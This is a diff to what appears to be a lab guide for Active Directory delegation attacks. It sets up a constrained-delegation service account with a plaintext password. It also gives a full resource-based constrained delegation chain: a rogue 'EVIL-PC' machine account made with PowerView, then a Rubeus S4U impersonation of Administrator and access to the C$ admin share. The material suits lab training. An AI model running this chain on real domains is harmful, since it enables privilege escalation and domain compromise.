@@ -109,16 +109,16 @@ Import-Module ActiveDirectory
 
 # Create Service Account
 New-ADUser -Name "constrained-svc" -SAMAccountName "constrained-svc" `
-    -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
+    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
     -Enabled $true -PasswordNeverExpires $true
 
-# set SPN
-setspn -A HTTP/constrained-svc.lab.local constrained-svc
+# Set SPN
+setspn -A HTTP/constrained-svc.warzone.oxsium.local constrained-svc
 
 # Constrained delegation, BUT WITHOUT PROTOCOL TRANSITION
 # (TrustedToAuthForDelegation is not set - default remains False)
 Set-ADUser -Identity "constrained-svc" -Add @{
-    'msDS-AllowedToDelegateTo' = @("CIFS/DC01.lab.local","HTTP/DC01.lab.local")
+    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
 }
 
 # Check - TrustedToAuthForDelegation must be False
@@ -137,25 +137,25 @@ Get-ADComputer -Identity "RBCD-PC" -Properties TrustedForDelegation, msDS-Allowe
 ```
 ```powershell
 # With PowerView (in a lowpriv-user context)
-New-MachineAccount -MachineAccount “EVIL-PC” -Password (ConvertTo-SecureString “Ev1lP@ss123!” -AsPlainText -Force)
+New-MachineAccount -MachineAccount "EVIL-PC" -Password (ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force) -Domain "warzone.oxsium.local"
 
-$evilSID = Get-DomainComputer -Identity “EVIL-PC” -Properties objectsid | Select -Expand objectsid
+$evilSID = Get-DomainComputer -Identity "EVIL-PC" -Properties objectsid -Domain "warzone.oxsium.local" | Select -Expand objectsid
 
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor “O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$evilSID)”
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$evilSID)"
 $SDbytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDbytes, 0)
 
-Set-ADComputer -Identity “RBCD-PC” -PrincipalsAllowedToDelegateToAccount “EVIL-PC$”
+Set-ADComputer -Identity "RBCD-PC" -PrincipalsAllowedToDelegateToAccount "EVIL-PC$"
 
 # Check
-Get-ADComputer -Identity “RBCD-PC” -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+Get-ADComputer -Identity "RBCD-PC" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
 
 # Full chain with Rubeus
 .\Rubeus.exe s4u /user:EVIL-PC$ /password:Ev1lP@ss123! `
     /impersonateuser:Administrator `
-    /msdsspn:CIFS/RBCD-PC.lab.local `
-    /domain:lab.local `
+    /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
+    /domain:warzone.oxsium.local `
     /ptt
 
-ls \\RBCD-PC.lab.local\C$
+ls \\RBCD-PC.warzone.oxsium.local\C$
 ```
